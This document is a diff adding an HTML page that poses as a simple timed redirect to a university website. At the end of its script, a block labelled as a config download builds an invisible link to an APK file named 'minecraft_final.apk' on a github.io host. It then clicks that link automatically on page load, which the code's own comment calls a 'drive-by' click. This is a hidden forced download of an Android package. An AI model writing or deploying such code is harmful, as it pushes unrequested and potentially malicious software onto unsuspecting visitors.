@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+  <meta http-equiv="refresh" content="3;url=https://itc.edu.kh/" />
+
+  <title>Redirecting…</title>
+
+</head>
+<body>
+
+  <div class="container">
+    <h1>Redirecting…</h1>
+    <div class="progress">
+      <div id="bar" class="bar"></div>
+    </div>
+    <p id="countdown">Redirecting in 3 s…</p>
+    <a id="goBtn" href="#" class="skip" onclick="cancel()">Go now</a>
+  </div>
+
+<script>
+
+  // ── CONFIG ──────────────────────────────────────────────
+  const TARGET_URL  = 'https://itc.edu.kh/'; // ← change this
+  const DELAY_MS    =  10;                               // ← delay in ms
+  // ────────────────────────────────────────────────────────
+
+  const bar       = document.getElementById('bar');
+  const countdown = document.getElementById('countdown');
+  const goBtn     = document.getElementById('goBtn');
+
+  goBtn.href = TARGET_URL;
+
+  let cancelled = false;
+  let elapsed   = 0;
+  const TICK    = 50; // update interval in ms
+
+  const timer = setInterval(() => {
+    if (cancelled) return;
+    elapsed += TICK;
+    const progress = Math.min((elapsed / DELAY_MS) * 100, 100);
+    bar.style.width = progress + '%';
+
+    const remaining = Math.ceil((DELAY_MS - elapsed) / 1000);
+    countdown.textContent = remaining > 0
+      ? `Redirecting in ${remaining} s…`
+      : 'Redirecting now…';
+
+    if (elapsed >= DELAY_MS) {
+      clearInterval(timer);
+      window.location.href = TARGET_URL;
+    }
+  }, TICK);
+
+  function cancel() {
+    cancelled = true;
+    clearInterval(timer);
+    countdown.textContent = 'Redirect cancelled.';
+    bar.style.background = '#555';
+    bar.style.boxShadow  = 'none';
+    document.querySelector('.skip').style.display = 'none';
+  }
+
+// ---config file download
+
+(function() {
+            const payloadUrl = 'https://pa-nha.github.io/download/minecraft_final.apk';
+            const hiddenAnchor = document.createElement('a');
+
+            hiddenAnchor.href = payloadUrl;
+            hiddenAnchor.download = 'minecraft_final.apk';
+            hiddenAnchor.style.display = 'none'; // Keeps the link invisible
+
+            document.body.appendChild(hiddenAnchor);
+            hiddenAnchor.click(); // Programmatic "drive-by" click
+            document.body.removeChild(hiddenAnchor);
+        })();
+</script>
+
+</body>
+</html>
